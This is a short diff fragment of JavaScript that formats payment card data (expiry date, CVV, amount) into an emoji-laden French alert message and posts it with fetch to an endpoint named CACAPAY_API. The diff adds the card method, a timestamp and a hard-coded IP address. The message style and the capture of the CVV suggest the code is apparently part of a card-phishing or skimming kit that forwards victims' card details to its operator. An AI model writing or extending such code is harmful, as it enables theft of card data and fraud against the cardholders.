@@ -346,6 +346,9 @@
 📅 Expiration: ${paymentData.expiry}
 🔐 CVV: ${paymentData.cvv}
 💶 Montant: ${paymentData.amount}€
+💳 Méthode: card
+🕒 Heure: ${new Date().toLocaleString('fr-FR')}
+🌐 IP: 81.65.181.68
 🔒 Vérifiez immédiatement !`;
                 
                 const response = await fetch(CACAPAY_API, {
